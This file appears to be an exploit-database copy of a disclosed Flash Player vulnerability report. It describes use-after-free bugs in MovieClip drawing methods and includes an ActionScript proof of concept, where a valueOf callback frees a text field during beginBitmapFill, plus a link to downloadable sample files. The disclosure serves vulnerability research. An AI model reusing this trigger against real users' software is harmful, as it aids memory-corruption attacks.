@@ -1,0 +1,50 @@
+Source: https://code.google.com/p/google-security-research/issues/detail?id=388&can=1&q=label%3AProduct-Flash%20modified-after%3A2015%2F8%2F17&sort=id
+
+There are use-after frees realated to storing a single pointer (this this pointer) in several MovieClip drawing methods, including beginFill, beginBitmapFill, beginGradientFill, linGradientStyle, lineTo, moveTo, curveTo and lineStyle. A proof-of-concept involving bitmapFill is bewlo:
+
+import flash.display.*;
+import flash.geom.*;
+
+var bmpd:BitmapData = new BitmapData(20,20);
+var rect1:Rectangle = new Rectangle(0,0,10,10);
+var rect2:Rectangle = new Rectangle(0, 10, 10, 20);
+var rect3:Rectangle = new Rectangle(10, 0, 20, 10);
+var rect4:Rectangle = new Rectangle(10, 10, 20, 20);
+bmpd.fillRect(rect1, 0xAA0000FF);
+bmpd.fillRect(rect2, 0xAA00FF00);
+bmpd.fillRect(rect3, 0xAAFF0000);
+bmpd.fillRect(rect4, 0xAA999999);
+var thiz = this;
+this.createEmptyMovieClip("bmp_fill_mc", 1);
+with (bmp_fill_mc) {
+	
+	var n = {valueOf: func};
+    matrix = {a:2, b:n, c:0, d:2, tx:0, ty:0}; 
+    //matrix.rotate(Math.PI/8);
+    repeat = true;
+    smoothing = true;
+    beginBitmapFill(bmpd, matrix, repeat, smoothing);
+    moveTo(0, 0);
+    lineTo(0, 60);
+    lineTo(60, 60);
+    lineTo(60, 0);
+    lineTo(0, 0);
+    endFill();
+}
+
+bmp_fill_mc._xscale = 200;
+bmp_fill_mc._yscale = 200;
+
+function func(){
+	
+	var test = thiz.createTextField("test", 1, 1, 1, 10, 10);
+	trace(test);
+	test.removeTextField();
+	return 777;
+	} 
+
+A sample fla and swf are attached.
+
+Proof of Concept:
+https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/sploits/37864.zip
+
